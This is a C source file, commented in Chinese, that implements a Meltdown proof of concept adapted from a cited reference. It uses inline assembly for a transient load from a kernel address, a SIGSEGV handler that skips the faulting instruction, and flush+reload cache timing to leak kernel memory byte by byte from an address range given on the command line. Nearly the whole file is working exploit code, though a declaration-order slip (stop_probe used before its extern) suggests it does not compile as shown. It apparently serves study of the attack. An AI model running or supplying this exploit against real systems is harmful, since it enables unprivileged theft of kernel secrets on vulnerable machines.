//主要参考文献[2]
//因为时间和能力的限制，且该程序需要用到比较偏僻的函数，还有汇编语言
//故我对[2]的代码进行了精学，[2]中考虑到了非x86-64，我的电脑是x86-64的，对非x86-64的也无法验证，
//所以在自己调试的时候将那部分删减了

#if !(defined(__x86_64__))
# error "Only x86-64 is supported at the moment"
#endif

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>

#define PAGE_SIZE	(1024 * 4)
#define PAGE_NUM	256
#define PROBE_TIMES 1000

static char probe_pages[PAGE_NUM * PAGE_SIZE];
static int cache_hit_threshold, cache_hit_times[PAGE_NUM];

static inline int get_access_delay(volatile char *addr)
{
  // 得到访问内存地址addr的延时
  unsigned long long time1, time2;
  unsigned test;  // 仅供试探用的变量
  time1 = __rdtscp(&test);
  (void)*addr;
  time2 = __rdtscp(&test);
  return time2 - time1; // 得到访问addr的延迟
}

static void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop_probe;
}

static int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

static void clflush_target(void)
{
  // flush试探数组
	for (int i = 0; i < PAGE_NUM; i++) // 对所有255个内存page进行flush操作
		_mm_clflush(&probe_pages[i * PAGE_SIZE]);
}

static void victim()
{
  // 打开version文件，等待被meltdown攻击
  // 将kernel数据缓存入cache
  static char buf[256];
  int fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return;
	}

  if (pread(fd, buf, sizeof(buf), 0) < 0)//通过系统调用读banner
    perror("pread");

  close(fd);
}

extern char stop_probe[];
static void __attribute__((noinline)) probe(unsigned long addr)
{
  //make kernel data(linux_proc_banner) in cache.
  victim();
  // transiant sequence，类似于paper中的表述
	asm volatile (	//让编译器不会优化这段代码
		"1:\n\t"

		".rept 300\n\t" //make the code below executed at same time.
		"add $0x14, %%rax\n\t"		//测试处理器能乱序执行成功
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"    //将目标内核地址所指向的数据放入eax寄存器中，这样做会引发异常
		"shl $12, %%rax\n\t"			//左移12位，为推测内核地址所指向的数据作准备
		"jz 1b\n\t"
		"movzx (%[probe_pages], %%rax, 1), %%rbx\n"  //move probe_pages to cache: rbx = [probe_pages + 4096 * (*addr)]

		"stop_probe: \n\t"
		"nop\n\t"
		:
		: [probe_pages] "r" (probe_pages),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}

static void update_cache_hit_times(void)
{
	int i, delay, page_index;
	volatile char *addr;
  // 遍历255个page，如果访问page的delay低于cache hit阈值，则视为命中
	for (i = 0; i < PAGE_NUM; i++) {
		page_index = ((i * 167) + 13) & 255; //取值结果为0-254随机数

		addr = &probe_pages[page_index * PAGE_SIZE];
		delay = get_access_delay(addr);

		if (delay <= cache_hit_threshold)
			cache_hit_times[page_index]++;
	}
}



static int read_byte_from_cache(unsigned long addr)
{
  // 利用侧信道攻击，获取cache内容
	int i, max = -1, index_of_max = -1;
	memset(cache_hit_times, 0, sizeof(cache_hit_times));
  // 试探，得到最高次cache hit次数，该page number即为目标byte值
	for (i = 0; i < PROBE_TIMES; i++) {
		clflush_target();
		_mm_mfence();

		probe(addr);
		update_cache_hit_times();
	}

  // 最小访问延迟代表试探page number结果，即为目标byte
	for (i = 1; i < PAGE_NUM; i++) {
		if (!isprint(i))
			continue;
		if (cache_hit_times[i] && cache_hit_times[i] > max) {
			max = cache_hit_times[i];
			index_of_max = i;
		}
	}
	return index_of_max;//index_of_max = *addr
}

static void set_cache_hit_threshold(void)
{
  // 设定cache命中判定阈值
	long cached, uncached, i;
  const int ESTIMATE_CYCLES = 1000000;
  // move probe_pages to cache.
  memset(probe_pages, 1, sizeof(probe_pages));

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_delay(probe_pages);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(probe_pages);
		uncached += get_access_delay(probe_pages);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;
  // 计算方法为1e6次试探中，命中次数的两倍
	cache_hit_threshold = cached * 2;
	printf("cached = %ld, uncached = %ld, threshold %d\n\n",
	       cached, uncached, cache_hit_threshold);
}

static void pin_cpu0()
{
  // 使用cpu 0进行实验
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

int main(int argc, char *argv[])
{
	unsigned long kernel_addr, size;
	sscanf(argv[1], "%lx", &kernel_addr);
	sscanf(argv[2], "%lx", &size);

	set_signal();
	pin_cpu0();
	set_cache_hit_threshold();

	for (int i = 0; i < size; i++) {
		int ret = read_byte_from_cache(kernel_addr);
		if (ret == -1)
			ret = 0xff;
		printf("read 0x%zx = %x %c (score=%d/%d)\n",
		       kernel_addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? cache_hit_times[ret] : 0,
		       PROBE_TIMES);
		kernel_addr++;
	}
}
